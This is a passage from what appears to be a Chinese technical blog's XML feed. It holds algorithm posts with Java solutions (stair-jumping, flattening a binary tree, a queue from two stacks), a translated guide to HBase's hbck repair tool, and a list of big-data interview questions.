        <content type="html"><![CDATA[<h1 id="青蛙跳台阶一阶、两阶，求n阶的台阶一共几种跳法"><a href="#青蛙跳台阶一阶、两阶，求n阶的台阶一共几种跳法" class="headerlink" title="青蛙跳台阶一阶、两阶，求n阶的台阶一共几种跳法"></a>青蛙跳台阶一阶、两阶，求n阶的台阶一共几种跳法</h1><p><strong>题目描述</strong><br>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法<br><strong>思路：</strong></p><pre><code>得到n个台阶，一共可以跳多少个2步,这个也是一个斐波那契数列的一个应用。对于本题前提只有一次跳一阶，和跳两阶。如果两种跳法，1阶或者2阶，那么假定第一次跳的是一阶，那么剩下的是n-1个台阶，跳法是f（n - 1）假定第一次跳的是2阶，那么剩下的是n-2个台阶，跳法是f(n - 2)那么这个时候就能够得到总的跳法为 f(n) = f(n - 1) + f(n - 2)，然后这个出口就是:只有一阶的时候f(1) = 1, 只有两阶的时候f(2) = 2;</code></pre><p><strong>递归实现：效率比较差</strong></p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">JumpFloor</span><span class="token punctuation">(</span><span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//第一次有两种选择，然后根据不同的选择，然后开始不同的下一步，但是下一步还是一样有两种选择</span>        <span class="token keyword">return</span> <span class="token function">JumpFloor</span><span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">JumpFloor</span><span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>非递归实现：</strong></p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">JumpFloor</span><span class="token punctuation">(</span><span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> z<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> target<span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            z <span class="token operator">=</span> y<span class="token punctuation">;</span>            y <span class="token operator">=</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>            x <span class="token operator">=</span> z<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拍平二叉树</title>
      <link href="/2019/02/13/suan-fa/er-cha-shu/pai-ping-er-cha-shu/"/>
      <url>/2019/02/13/suan-fa/er-cha-shu/pai-ping-er-cha-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="拍平二叉树"><a href="#拍平二叉树" class="headerlink" title="拍平二叉树"></a>拍平二叉树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，你要将它拍平，使得每个节点都只有右子树，并且拍平后的二叉树从上到下的节点是原二叉树前序遍历的结果。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">      0</span><span class="token code keyword">    /   \</span>   1     2  / \     \ 4   8    16将它拍平后，得到的二叉树是：  0   \<span class="token code keyword">    1</span><span class="token code keyword">     \</span><span class="token code keyword">      4</span><span class="token code keyword">       \</span><span class="token code keyword">        8</span><span class="token code keyword">         \</span><span class="token code keyword">          2</span><span class="token code keyword">           \</span><span class="token code keyword">           16</span></code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">preorder</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preorder</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preorder</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">flattenPreorder</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preorder</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>    TreeNode cur <span class="token operator">=</span> root<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      cur<span class="token punctuation">.</span>left <span class="token operator">=</span> null<span class="token punctuation">;</span>      cur<span class="token punctuation">.</span>right <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>      cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> TreeNode prev <span class="token operator">=</span> null<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">flattenReversePreorder</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token function">flattenReversePreorder</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">flattenReversePreorder</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> null<span class="token punctuation">;</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> prev<span class="token punctuation">;</span>    prev <span class="token operator">=</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用栈实现队列</title>
      <link href="/2019/02/13/suan-fa/shi-yong-zhan-shi-xian-dui-lie/"/>
      <url>/2019/02/13/suan-fa/shi-yong-zhan-shi-xian-dui-lie/</url>
      
        <content type="html"><![CDATA[<h2 id="使用栈实现队列"><a href="#使用栈实现队列" class="headerlink" title="使用栈实现队列"></a>使用栈实现队列</h2><p><strong>问题</strong></p><p>这个题目说的是，你要使用栈来实现一个队列，需要实现队列中常用的 4 个函数。其中，push 函数往队尾加入一个元素；pop 函数把队首元素移除；peek 函数返回队首元素；empty 函数返回队列是否为空。另外你的实现不需要考虑异常操作情况，比如从一个空队列里 pop 元素。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyQueue</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Stack<span class="token operator">&lt;</span>Integer<span class="token operator">></span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">transferIfEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>out<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>in<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          out<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      in<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">transferIfEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">transferIfEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> in<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> out<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hbase hbck深入</title>
      <link href="/2019/02/11/hbase/hbase-hbck-shen-ru/"/>
      <url>/2019/02/11/hbase/hbase-hbck-shen-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="Hbase-hbck深入"><a href="#Hbase-hbck深入" class="headerlink" title="Hbase hbck深入"></a>Hbase hbck深入</h1><p>官网介绍:<a href="http://hbase.apache.org/book.html#hbck.in.depth" target="_blank" rel="noopener">http://hbase.apache.org/book.html#hbck.in.depth</a><br>HBaseFsck（hbck）是一个用于检查区域一致性和表完整性问题并修复损坏的HBase的工具。它工作在两种基本模式 - 只读不一致识别模式和多阶段读写修复模式。</p><h2 id="1-运行hbck来识别不一致"><a href="#1-运行hbck来识别不一致" class="headerlink" title="1. 运行hbck来识别不一致"></a>1. 运行hbck来识别不一致</h2><p>要检查您的HBase集群是否损坏，请针对您的HBase集群运行hbck：</p><p>$ ./bin/hbase hbck<br>在命令输出结束时，它会打印OK或告诉您存在的INCONSISTENCIES数量。您可能还想运行hbck几次，因为一些不一致可能是暂时的（例如，群集正在启动或区域正在分裂）。在操作上，您可能希望定期运行hbck并在其重复报告不一致时设置警报（例如通过nagios）。一连串的hbck将报告不一致的列表以及受影响的区域和表格的简要描述。使用该-details选项将报告更多细节，包括所有表格中所有分割的代表性列表。</p><p>$ ./bin/hbase hbck -details<br>如果您只想知道某些表是否已损坏，则可以限制hbck以仅在特定表中标识不一致。例如，以下命令只会尝试检查表TableFoo和TableBar。好处是hbck运行时间更短。</p><p>$ ./bin/hbase hbck TableFoo TableBar</p><h2 id="2-不一致性"><a href="#2-不一致性" class="headerlink" title="2. 不一致性"></a>2. 不一致性</h2><p>如果经过多次运行，不一致仍会继续报告，您可能会遇到腐败现象。这些应该是罕见的，但是如果它们发生在较新版本的HBase中，则包括启用了自动修复选项的hbck工具。</p><p>有两个不变式在违反HBase时会产生不一致：</p><p>如果每个区域都被分配和部署在一个区域服务器上，并且这个状态保存的所有地方都是一致的，那么HBase的区域一致性不变是满足的。</p><p>如果对于每个表，每个可能的行键只解析为一个区域，HBase的表完整性不变是满足的。</p><p>修复通常分三个阶段进行：识别不一致的只读信息收集阶段，恢复表完整性不变的表完整性修复阶段，以及最后恢复区域一致性不变的区域一致性修复阶段。从版本0.90.0开始，hbck可以检测关于可能的表完整性问题的子集的区域一致性问题报告。它还包括自动修复最常见的不一致性，区域分配和部署一致性问题的能力。此修复可以通过使用-fix命令行选项完成。如果这些问题在错误的服务器或多个区域服务器上打开，则这些问题会关闭区域，并且如果区域服务器未打开，也会将区域分配给区域服务器</p><p>从HBase版本0.90.7,0.92.2和0.94.0开始，引入了几个新的命令行选项来帮助修复损坏的HBase。这个hbck有时会被昵称“uberhbck”取代。每个特定版本的uber hbck都与相同主版本的HBase兼容（0.90.7 uberhbck可以修复0.90.4）。但是，版本.90.90.6和版本⇐0.92.1可能需要重新启动主节点或故障转移到备份主节点。</p><h2 id="3-本地化维修"><a href="#3-本地化维修" class="headerlink" title="3. 本地化维修"></a>3. 本地化维修</h2><p>修复损坏的HBase时，最好先修复最低风险的不一致。这些通常是区域一致性修复 - 局部单一区域修复，它只修改内存数据，临时动物园管理员数据或META表中的修补程序漏洞。区域一致性要求HBase实例具有HDFS（.regioninfo文件）中区域数据的状态，hbase：meta表中的区域行，以及区域服务器和主区域上的区域部署/分配。修复区域一致性的选项包括：</p><p>-fixAssignments（相当于0.90 -fix选项）可修复未分配，错误分配或乘数分配的区域。</p><p>-fixMeta当HDFS中不存在相应的区域时删除元行，并且如果它们的区域存在于HDFS中而不在META中则添加新的元行。要修复部署和分配问题，您可以运行以下命令：</p><p>$ ./bin/hbase hbck -fixAssignments<br>要修复部署和分配问题以及修复不正确的元行，您可以运行以下命令：</p><p>$ ./bin/hbase hbck -fixAssignments -fixMeta<br>有几类表完整性问题是低风险修复。前两个是简并（startkey == endkey）区域和向后区域（startkey&gt; endkey）。这些通过将数据旁路到临时目录（/ hbck / xxxx）来自动处理。第三个低风险类是hdfs地区漏洞。这可以通过使用以下来修复：</p><p>-fixHdfsHoles选项用于在文件系统上制作新的空白区域。如果检测到漏洞，则可以使用-fixHdfsHoles，并应包含-fixMeta和-fixAssignments以使新区域保持一致。</p><p>$ ./bin/hbase hbck -fixAssignments -fixMeta -fixHdfsHoles<br>由于这是一种常见操作，因此我们添加了一个-repairHoles与上一个命令等效的标志：</p><p>$ ./bin/hbase hbck -repairHoles<br>如果这些步骤之后仍然存在不一致问题，则很可能出现与孤立或重叠区域相关的表完整性问题。</p><h2 id="4-地区重叠修理"><a href="#4-地区重叠修理" class="headerlink" title="4. 地区重叠修理"></a>4. 地区重叠修理</h2><p>表完整性问题可能需要处理重叠的修复。这是一项风险较大的操作，因为它需要修改文件系统，需要做出一些决策，并且可能需要一些手动步骤。对于这些修理，最好分析一次hbck -details 运行的输出，以便在检查发现问题时仅隔离维修尝试。因为这是更危险的，所以应该使用保护来限制维修的范围。警告：这是一个相对较新的版本，只在线上测试过，但闲置的HBase实例（没有读/写）。在积极的生产环境中使用您自己的风险！修复表完整性违规的选项包括：</p><p>-fixHdfsOrphans 选择“采用”缺少区域元数据文件（.regioninfo文件）的区域目录。</p><p>-fixHdfsOverlaps固定重叠区域的能力</p><p>在修复重叠区域时，可以通过两种方式在文件系统上修改区域的数据：1）通过将区域合并到更大的区域中或2）通过将数据移动到稍后可以恢复数据的“sideline”目录的旁路区域。合并大量区域在技术上是正确的，但可能导致需要一系列昂贵的压缩和分裂操作的非常大的区域。在这些情况下，最好将与其他大多数地区（可能是最大范围）重叠的地区划分开来，以便合并可以在更合理的范围内进行。由于这些边界区域已经布局在HBase的本地目录和HFile格式中，因此可以使用HBase的批量加载机制进行恢复。默认的保障阈值是保守的。</p><p>-maxMerge <n> 最大数量的重叠区域要合并</n></p><p>-sidelineBigOverlaps 如果超过maxMerge区域重叠，副业尝试旁路与其他大多数区域重叠的区域。</p><p>-maxOverlapsToSideline <n> 如果大面积重叠的地区，副业最多n个地区。</n></p><p>由于您经常只想修复表格，因此您可以使用此选项打开所有修复选项：</p><p>-repair 包括所有区域一致性选项以及只有孔修复表完整性选项。</p><p>最后，还有一些保护措施可以限制对特定表格的修复。例如，以下命令只会尝试检查并修复表格TableFoo和TableBar。</p><p>$ ./bin/hbase hbck -repair TableFoo TableBar</p><h3 id="4-1-特殊情况：Meta未正确分配"><a href="#4-1-特殊情况：Meta未正确分配" class="headerlink" title="4.1. 特殊情况：Meta未正确分配"></a>4.1. 特殊情况：Meta未正确分配</h3><p>有一些hbck可以处理的特殊情况。有时，元表唯一的区域不一致地分配或部署。在这种情况下，有一个特殊-fixMetaOnly选项可以尝试修复元分配。</p><p>$ ./bin/hbase hbck -fixMetaOnly -fixAssignments</p><h3 id="4-2-特殊情况：HBase版本文件丢失"><a href="#4-2-特殊情况：HBase版本文件丢失" class="headerlink" title="4.2. 特殊情况：HBase版本文件丢失"></a>4.2. 特殊情况：HBase版本文件丢失</h3><p>HBase的文件系统数据需要一个版本文件才能启动。如果缺少这个文件，您可以使用该-fixVersionFile选项来制作新的HBase版本文件。这假设您正在运行的hbck版本是适用于HBase集群的版本。</p><h3 id="4-3-特殊情况：Root和META已损坏。"><a href="#4-3-特殊情况：Root和META已损坏。" class="headerlink" title="4.3. 特殊情况：Root和META已损坏。"></a>4.3. 特殊情况：Root和META已损坏。</h3><p>最严重的腐败情况是ROOT或META损坏且HBase无法启动的情况。在这种情况下，您可以使用OfflineMetaRepair工具创建新的ROOT和META区域和表格。该工具假定HBase处于离线状态。然后通过现有的HBase主目录进行游览，从文件系统尽可能多地从区域元数据文件（.regioninfo文件）中加载信息。如果区域元数据具有适当的表完整性，则会旁路原始根目录和元目录表目录，并使用指向区域目录及其数据的指针构建新的目录。</p><p>$ ./bin/hbase org.apache.hadoop.hbase.util.hbck.OfflineMetaRepair<br>这个工具不像uberhbck那样聪明，但可以用来引导uberhbck可以完成的修复。如果工具成功，您应该能够启动hbase并在必要时运行联机修复。</p><h3 id="4-4-特殊情况：离线分离父母"><a href="#4-4-特殊情况：离线分离父母" class="headerlink" title="4.4. 特殊情况：离线分离父母"></a>4.4. 特殊情况：离线分离父母</h3><p>一旦区域被拆分，离线父母将自动清理。有时，女儿地区在父母清理之前会再次分裂。HBase可以按照正确的顺序清理父母。但是，有时候可能会有一些徘徊在离线分裂的父母身上。他们在META中，在HDFS中，没有部署。但是HBase无法清理它们。在这种情况下，您可以使用该-fixSplitParents选项在META中重置它们以联机并且不拆分。因此，如果使用修复重叠区域选项，hbck可以将它们与其他区域合并。</p><p>这个选项通常不应该被使用，并且它不在-fixAll。</p><p>转载自：<a href="https://blog.csdn.net/xfg0218/article/details/79542284" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hbase </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hbase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018年面试过阿里、网易、海康的大数据总结的面试题</title>
      <link href="/2019/02/06/mian-shi-xi-lie/2018-nian-mian-shi-guo-a-li-wang-yi-hai-kang-de-da-shu-ju-zong-jie-de-mian-shi-ti/"/>
      <url>/2019/02/06/mian-shi-xi-lie/2018-nian-mian-shi-guo-a-li-wang-yi-hai-kang-de-da-shu-ju-zong-jie-de-mian-shi-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="2018年面试过阿里、网易、海康的大数据总结的面试题"><a href="#2018年面试过阿里、网易、海康的大数据总结的面试题" class="headerlink" title="2018年面试过阿里、网易、海康的大数据总结的面试题"></a>2018年面试过阿里、网易、海康的大数据总结的面试题</h1><h2 id="1-spark运行流程、源码架构"><a href="#1-spark运行流程、源码架构" class="headerlink" title="(1)spark运行流程、源码架构"></a>(1)spark运行流程、源码架构</h2><h2 id="2-Hbase主键设计、hbase为啥比mysql快、为什么项目选用hbase"><a href="#2-Hbase主键设计、hbase为啥比mysql快、为什么项目选用hbase" class="headerlink" title="(2)Hbase主键设计、hbase为啥比mysql快、为什么项目选用hbase"></a>(2)Hbase主键设计、hbase为啥比mysql快、为什么项目选用hbase</h2><h2 id="3-Hbase读写流程，数据compact流程"><a href="#3-Hbase读写流程，数据compact流程" class="headerlink" title="(3)Hbase读写流程，数据compact流程"></a>(3)Hbase读写流程，数据compact流程</h2><h3 id="HBase写数据流程"><a href="#HBase写数据流程" class="headerlink" title="HBase写数据流程"></a>HBase写数据流程</h3><pre><code>1,Client先访问zookeeper，从meta表获取相应region信息，然后找到meta表的数据2,根据namespace、表名和rowkey根据meta表的数据找到写入数据对应的region信息3,找到对应的regionserver4,把数据分别写到HLog和MemStore上一份4,MemStore达到一个阈值后则把数据刷成一个StoreFile文件。（若MemStore中的数据有丢失，则可以总HLog上恢复）5,当多个StoreFile文件达到一定的大小后，会触发Compact合并操作，合并为一个StoreFile，（这里同时进行版本的合并和数据删除。）6,当Storefile大小超过一定阈值后，会把当前的Region分割为两个（Split），并由Hmaster分配到相应的HRegionServer，实现负载均衡</code></pre><h3 id="HBase读数据流程"><a href="#HBase读数据流程" class="headerlink" title="HBase读数据流程"></a>HBase读数据流程</h3><pre><code>1,Client先访问zookeeper，从meta表读取region的位置，然后读取meta表中的数据。meta中又存储了用户表的region信息。2,根据namespace、表名和rowkey在meta表中找到对应的region信息3,找到这个region对应的regionserver4,查找对应的region5,先从MemStore找数据，如果没有，再到StoreFile上读(为了读取的效率)。</code></pre><h3 id="compact流程"><a href="#compact流程" class="headerlink" title="compact流程"></a>compact流程</h3><p><a href="https://blog.csdn.net/ZYC88888/article/details/79666846" target="_blank" rel="noopener">https://blog.csdn.net/ZYC88888/article/details/79666846</a></p><h2 id="4-Hadoop-mapreduce流程"><a href="#4-Hadoop-mapreduce流程" class="headerlink" title="(4)Hadoop mapreduce流程"></a>(4)Hadoop mapreduce流程</h2><h2 id="5-Spark-standalone模型、yarn架构模型-画出来架构图"><a href="#5-Spark-standalone模型、yarn架构模型-画出来架构图" class="headerlink" title="(5)Spark standalone模型、yarn架构模型(画出来架构图)"></a>(5)Spark standalone模型、yarn架构模型(画出来架构图)</h2><h2 id="6-Spark算子-map、flatmap、reducebykey和reduce、groupbykey和reducebykey、join、distinct-原理"><a href="#6-Spark算子-map、flatmap、reducebykey和reduce、groupbykey和reducebykey、join、distinct-原理" class="headerlink" title="(6)Spark算子(map、flatmap、reducebykey和reduce、groupbykey和reducebykey、join、distinct)原理"></a>(6)Spark算子(map、flatmap、reducebykey和reduce、groupbykey和reducebykey、join、distinct)原理</h2><p><a href="https://blog.csdn.net/dream0352/article/details/62229977" target="_blank" rel="noopener">https://blog.csdn.net/dream0352/article/details/62229977</a></p><h2 id="7-Spark-stage的切分、task资源分配、任务调度、master计算资源分配"><a href="#7-Spark-stage的切分、task资源分配、任务调度、master计算资源分配" class="headerlink" title="(7)Spark stage的切分、task资源分配、任务调度、master计算资源分配"></a>(7)Spark stage的切分、task资源分配、任务调度、master计算资源分配</h2><h2 id="8-Sparksql自定义函数、怎么创建dateframe"><a href="#8-Sparksql自定义函数、怎么创建dateframe" class="headerlink" title="(8)Sparksql自定义函数、怎么创建dateframe"></a>(8)Sparksql自定义函数、怎么创建dateframe</h2><h2 id="9-Sparkstreaming项目多久一个批次数据"><a href="#9-Sparkstreaming项目多久一个批次数据" class="headerlink" title="(9)Sparkstreaming项目多久一个批次数据"></a>(9)Sparkstreaming项目多久一个批次数据</h2><h2 id="10-Kafka复制机制、分区多副本机制"><a href="#10-Kafka复制机制、分区多副本机制" class="headerlink" title="(10)Kafka复制机制、分区多副本机制"></a>(10)Kafka复制机制、分区多副本机制</h2><p><a href="https://blog.csdn.net/lizhitao/article/details/51718185" target="_blank" rel="noopener">https://blog.csdn.net/lizhitao/article/details/51718185</a></p><h2 id="11-Hdfs读写流程，数据checkpoint流程"><a href="#11-Hdfs读写流程，数据checkpoint流程" class="headerlink" title="(11)Hdfs读写流程，数据checkpoint流程"></a>(11)Hdfs读写流程，数据checkpoint流程</h2><h2 id="12-Sparkshuffle和hadoopshuffle原理、对比"><a href="#12-Sparkshuffle和hadoopshuffle原理、对比" class="headerlink" title="(12)Sparkshuffle和hadoopshuffle原理、对比"></a>(12)Sparkshuffle和hadoopshuffle原理、对比</h2><h2 id="13-Hivesql怎么转化为MapReduce任务"><a href="#13-Hivesql怎么转化为MapReduce任务" class="headerlink" title="(13)Hivesql怎么转化为MapReduce任务"></a>(13)Hivesql怎么转化为MapReduce任务</h2><h2 id="14-Spark调优"><a href="#14-Spark调优" class="headerlink" title="(14)Spark调优"></a>(14)Spark调优</h2><h2 id="15-Spark数据倾斜解决方案"><a href="#15-Spark数据倾斜解决方案" class="headerlink" title="(15)Spark数据倾斜解决方案"></a>(15)Spark数据倾斜解决方案</h2><p><a href="https://blog.csdn.net/weixin_42688876/article/details/82708580" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42688876/article/details/82708580</a></p><h2 id="16-Yarn工作流程、组成架构"><a href="#16-Yarn工作流程、组成架构" class="headerlink" title="(16)Yarn工作流程、组成架构"></a>(16)Yarn工作流程、组成架构</h2><h2 id="17-Zookeeper首领选取、节点类型、zookeeper实现原理"><a href="#17-Zookeeper首领选取、节点类型、zookeeper实现原理" class="headerlink" title="(17)Zookeeper首领选取、节点类型、zookeeper实现原理"></a>(17)Zookeeper首领选取、节点类型、zookeeper实现原理</h2><h2 id="18-hbase的ha，zookeeper在其中的作用"><a href="#18-hbase的ha，zookeeper在其中的作用" class="headerlink" title="(18)hbase的ha，zookeeper在其中的作用"></a>(18)hbase的ha，zookeeper在其中的作用</h2><h2 id="19-spark的内存管理机制，spark1-6前后对比分析"><a href="#19-spark的内存管理机制，spark1-6前后对比分析" class="headerlink" 